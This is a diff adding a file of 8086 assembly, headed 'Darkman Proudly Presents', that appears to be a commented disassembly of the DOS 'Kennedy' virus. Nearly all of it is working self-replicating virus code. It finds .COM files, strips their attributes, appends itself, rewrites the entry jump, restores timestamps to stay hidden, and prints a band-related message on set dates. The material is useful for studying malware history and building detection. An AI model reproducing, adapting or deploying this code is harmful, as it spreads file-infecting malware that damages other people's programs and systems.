@@ -1,0 +1,138 @@
+;                D     A     R     K     M     A     N
+;                           Proudly Presents
+;             D I S A S S E M B L Y   O F   K E N N E D Y
+
+
+kennedy      segment
+             assume  cs:kennedy,ds:kennedy
+             org     100h                ; Origin of COM-file
+
+code:
+jumpinst     db     0e9h,0ch,00h         ; Jump to viruscode
+             nop
+             nop
+             nop
+             int     20h                 ; Exit to DOS!
+virusname    db      'Kennedy'
+viruscode:
+             call    kennedycode
+kennedycode:
+             pop     si                  ; Load SI from stack
+             sub     si,10fh             ; SI = delta offset
+             mov     bp,[si+offset jumpadr-3]
+             mov     ah,2ah              ; Get system date
+             int     21h                 ; Do it!
+             cmp     dx,606h             ; 6th July?
+             jz      announce            ; Yes? Jump to announce
+             cmp     dx,0b12h            ; 18th December?
+             jz      announce            ; Yes? Jump to announce
+             cmp     dx,0b16h            ; 22th December?
+             jz      announce            ; Yes? Jump to announce
+             lea     dx,[si+filespec-3]  ; DX = offset of filespec
+             xor     cx,cx               ; Clear CX
+             mov     ah,4eh              ; Find first matching file
+findnext:
+             int     21h                 ; Do it!
+             jb      virusexit           ; Error? Jump to virusexit
+             call    checkfile
+             jb      virusexit           ; Error? Jump to virusexit
+             mov     ah,4fh              ; Find next matching file
+             jmp     findnext
+virusexit:
+             mov     ax,bp
+             add     ax,103h             ; AX = offset of real code
+             jmp     ax                  ; Jump to the real code
+announce:
+             lea     dx,[si+announcement-3]
+             mov     ah,09h              ; Standard output string
+             int     21h                 ; Do it!
+             jmp     virusexit
+checkfile:
+             mov     ax,4300h            ; Get file attributes
+             mov     dx,9eh              ; DX = offset of filname in DTA
+             int     21h                 ; Do it!
+             mov     [si+offset fileinfo],cx
+             mov     ax,4301h            ; Set file attributes
+             xor     cx,cx               ; Clear CX
+             int     21h                 ; Do it!
+             mov     ax,3d02h            ; Open file (read/write file)
+             int     21h                 ; Do it!
+             mov     bx,ax
+             mov     ah,3fh              ; Read from file
+             lea     dx,[si+offset fileinfo-3]
+             mov     di,dx
+             mov     cx,03h              ; Read 3 bytes
+             int     21h                 ; Do it!
+             cmp     byte ptr [di],0e9h  ; First instruction jump?
+             jz      infectfile          ; Yes? Jump to infectfile
+restoreattr:
+             call    setfileattr
+             clc                        ; Clear carry flag
+             ret                         ; Return!
+infectfile:
+             mov     dx,[di+01h]
+             mov     [si+offset jumpadr-3],dx
+             xor     cx,cx               ; Clear CX
+             mov     ax,4200h            ; Move file pointer from beginning
+             int     21h                 ; Do it!
+             mov     dx,di
+             mov     cx,02h              ; Read 2 bytes
+             mov     ah,3fh              ; Read from file
+             int     21h                 ; Do it!
+             cmp     [di],6465h          ; Already infected?
+             jz      restoreattr         ; Yes? Jump to restoreattr
+             xor     dx,dx               ; Clear DX
+             xor     cx,cx               ; Clear CX
+             mov     ax,4202h            ; Move file pointer from end
+             int     21h                 ; Do it!
+             cmp     dx,00h              ; DX = 0? (Filesize = 0)
+             jnz     restoreattr         ; Not equal? Jump to restoreattr
+             cmp     ax,0fde8h           ; AX = 65000? (Filesize >= 65000)
+             jnb     restoreattr         ; Greater or equal? Jump restoreattr
+             add     ax,04h              ; AX = AX + 4
+             mov     [si+offset fileinfo+6],ax
+             mov     ax,5700h            ; Get file date and time
+             int     21h                 ; Do it!
+             mov     [si+offset fileinfo+2],cx
+             mov     [si+offset fileinfo+4],dx
+             mov     ah,40h              ; Write to file
+             lea     dx,[si+virusname-3]
+             mov     cx,14dh             ; Write 333 bytes
+             int     21h                 ; Do it!
+             jb      restoredate         ; Error? Jump to restoredate
+             mov     ax,4200h            ; Move file pointer from beginning
+             xor     cx,cx               ; Clear CX
+             mov     dx,01h              ; Move file pointer to second byte
+             int     21h                 ; Do it!
+             mov     ah,40h              ; Write to file
+             lea     dx,[si+offset fileinfo+6]
+             mov     cx,02h              ; Write 2 bytes
+             int     21h                 ; Do it!
+restoredate:
+             mov     cx,[si+offset fileinfo+2]
+             mov     dx,[si+offset fileinfo+4]
+             mov     ax,5701h            ; Set file date and time
+             int     21h                 ; Do it!
+             mov     ah,3eh              ; Close file
+             int     21h                 ; Do it!
+             call    setfileattr
+             stc                         ; Set carry flag
+             ret                         ; Return!
+setfileattr:
+             mov     ax,4301h            ; Set file attributes
+             mov     cx,[si+offset fileinfo]
+             int     21h                 ; Do it!
+             ret                         ; Return!
+
+realcodeoff  db      03h,00h             ; Offset of the real code
+filespec     db      '*.COM',00h         ; Filespecification
+commandpath  db      '\COMMAND.COM',00h  ; Path of COMMAND.COM
+announcement db      'Kennedy er d›d - ' ; This announcement will be
+             db      'l‘nge leve "The '  ; typed on the screen, if the
+             db      'Dead Kennedys"'    ; virus is activated at one of the
+             db      0dh,0ah,'$'         ; activation dates
+fileinfo     db      43 dup(?)           ; Information about infected file
+                                         ; and the soon infected file!!!
+
+kennedy      ends
+end          code
